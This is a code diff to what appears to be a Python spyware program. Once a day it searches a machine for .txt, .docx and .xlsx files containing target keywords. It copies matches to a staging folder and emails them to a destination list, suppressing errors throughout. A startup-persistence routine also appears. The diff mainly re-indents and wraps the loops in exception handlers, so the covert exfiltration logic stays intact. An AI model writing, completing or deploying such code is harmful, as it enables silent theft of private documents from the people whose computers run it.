@@ -216,93 +216,93 @@ class OSmanipulation(object):
         while self.continue_checking_flag is True:
             time.sleep(86400)
             try:
-            for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
-                for each in files:
-                    if each.endswith('txt'):
-                        temp=str(each)
-                        temp=os.path.join(root,temp)
-                        try:
-                            file_to_check = open(temp)
-                            wordList = Constants.WORD_LIST
-                            check = False
-                            for word in wordList:
-                                try:
-                                     #if word.strip() in file_to_check:
-                                     #   check=True
-                                    s = mmap.mmap(file_to_check.fileno(), 0, access=mmap.ACCESS_READ)
-                                    if s.find(word.encode()) != -1:
-                                        check = True
-                                except UnicodeDecodeError and ValueError:
-                                    pass
-                            if check:
-                                shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
-                            file_to_check.close()
-                        except IOError:
-                            pass
-
-                    if each.endswith('docx'):
-                        temp = str(each)
-                        temp = os.path.join(root, temp)
-                        #s = "אלגוריתם"
-                        for s in Constants.WORD_LIST:
-                            word = win32.gencache.EnsureDispatch('Word.Application')
-                            word.Visible = False
-                            z = s.encode()
-                            #check=False
-                            for infile in glob.glob(temp):
+                for root, dirs, files in os.walk(Constants.SEARCH_ROOT):
+                    for each in files:
+                        if each.endswith('txt'):
+                            temp=str(each)
+                            temp=os.path.join(root,temp)
+                            try:
+                                file_to_check = open(temp)
+                                wordList = Constants.WORD_LIST
                                 check = False
-                                try:
-                                    doc = word.Documents.Open(infile)
-                                    for word_t in doc.Words:
-                                        if str(z) in str(str(word_t).encode()).replace(" ", ""):
+                                for word in wordList:
+                                    try:
+                                         #if word.strip() in file_to_check:
+                                         #   check=True
+                                        s = mmap.mmap(file_to_check.fileno(), 0, access=mmap.ACCESS_READ)
+                                        if s.find(word.encode()) != -1:
                                             check = True
-                                    doc.Close()
-                                    if check:
-                                        shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
-    
-                                except Exception:
-                                    pass
-                    if each.endswith('xlsx'):
-                        #try:
-                        for s in Constants.WORD_LIST:
-                            word = str(str(s).encode())
+                                    except UnicodeDecodeError and ValueError:
+                                        pass
+                                if check:
+                                    shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
+                                file_to_check.close()
+                            except IOError:
+                                pass
+
+                        if each.endswith('docx'):
                             temp = str(each)
                             temp = os.path.join(root, temp)
-                            #print(word)
-                            try:
-                                workbook = xlrd.open_workbook(temp)
-                                na=workbook.sheet_names()
-                                na[0].replace(" ", "")
-                                #print(na)
-                                for a in na:
-                                    worksheet = workbook.sheet_by_name(str(a))
-                                    num_rows = worksheet.nrows - 1
-                                    num_cells = worksheet.ncols - 1
-                                    curr_row = -1
-                                    while curr_row < num_rows:
-                                            curr_row += 1
-                                            row = worksheet.row(curr_row)
-                                            curr_cell = -1
-                                            while curr_cell < num_cells:
-                                                    check = False
-                                                    curr_cell += 1
-                                                    # Cell Types: 0=Empty, 1=Text, 2=Number, 3=Date, 4=Boolean, 5=Error, 6=Blank
-                                                    cell_type = worksheet.cell_type(curr_row, curr_cell)
-                                                    cell_value = worksheet.cell_value(curr_row, curr_cell)
-                                                    #print(cell_value)
-                                                    cell_value = str(cell_value).replace(" ", "")
-                                                    cell_value = cell_value.lower()
-    
-                                                    if str(str(cell_value).encode())in word:
-                                                        check = True
-                                                    cell_value = str(str(cell_value).encode())
-                                                    arra = [(a.start(), a.end()) for a in list(re.finditer(word, cell_value))]
-                                                    if len(arra) >= 1:
-                                                        check = True
-                                                    if check:
-                                                        shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
-                            except Exception:
-                                pass
+                            #s = "אלגוריתם"
+                            for s in Constants.WORD_LIST:
+                                word = win32.gencache.EnsureDispatch('Word.Application')
+                                word.Visible = False
+                                z = s.encode()
+                                #check=False
+                                for infile in glob.glob(temp):
+                                    check = False
+                                    try:
+                                        doc = word.Documents.Open(infile)
+                                        for word_t in doc.Words:
+                                            if str(z) in str(str(word_t).encode()).replace(" ", ""):
+                                                check = True
+                                        doc.Close()
+                                        if check:
+                                            shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
+        
+                                    except Exception:
+                                        pass
+                        if each.endswith('xlsx'):
+                            #try:
+                            for s in Constants.WORD_LIST:
+                                word = str(str(s).encode())
+                                temp = str(each)
+                                temp = os.path.join(root, temp)
+                                #print(word)
+                                try:
+                                    workbook = xlrd.open_workbook(temp)
+                                    na=workbook.sheet_names()
+                                    na[0].replace(" ", "")
+                                    #print(na)
+                                    for a in na:
+                                        worksheet = workbook.sheet_by_name(str(a))
+                                        num_rows = worksheet.nrows - 1
+                                        num_cells = worksheet.ncols - 1
+                                        curr_row = -1
+                                        while curr_row < num_rows:
+                                                curr_row += 1
+                                                row = worksheet.row(curr_row)
+                                                curr_cell = -1
+                                                while curr_cell < num_cells:
+                                                        check = False
+                                                        curr_cell += 1
+                                                        # Cell Types: 0=Empty, 1=Text, 2=Number, 3=Date, 4=Boolean, 5=Error, 6=Blank
+                                                        cell_type = worksheet.cell_type(curr_row, curr_cell)
+                                                        cell_value = worksheet.cell_value(curr_row, curr_cell)
+                                                        #print(cell_value)
+                                                        cell_value = str(cell_value).replace(" ", "")
+                                                        cell_value = cell_value.lower()
+        
+                                                        if str(str(cell_value).encode())in word:
+                                                            check = True
+                                                        cell_value = str(str(cell_value).encode())
+                                                        arra = [(a.start(), a.end()) for a in list(re.finditer(word, cell_value))]
+                                                        if len(arra) >= 1:
+                                                            check = True
+                                                        if check:
+                                                            shutil.copy2(temp, Constants.DESTINATION_FOLDER_PATH)
+                                except Exception:
+                                    pass
             except:
                 pass                
     def stop_copying(self):
@@ -379,17 +379,19 @@ class AttachMail():
 
     def sendMailInFolder(self):
         while True:
-            time.sleep(86400)
-            del_old_files=OSmanipulation()
-            del_old_files.erase_old_files()
-            self.start_server()
-            for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
-                for each in files:
-                    temp=str(each)
-                    temp=os.path.join(root,temp)
-                    self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
-            self.stop_server()
-
+            try:
+                time.sleep(86400)
+                del_old_files=OSmanipulation()
+                del_old_files.erase_old_files()
+                self.start_server()
+                for root, dirs, files in os.walk(Constants.DESTINATION_FOLDER_PATH):
+                    for each in files:
+                        temp=str(each)
+                        temp=os.path.join(root,temp)
+                        self.sendMail(Constants.EMAIL_DESTINATION_LIST,"python","python",temp)
+                self.stop_server()
+            except:
+                pass
 # Wasn't working out for us
 def add_self_to_startup():
     # Check if program is in startup
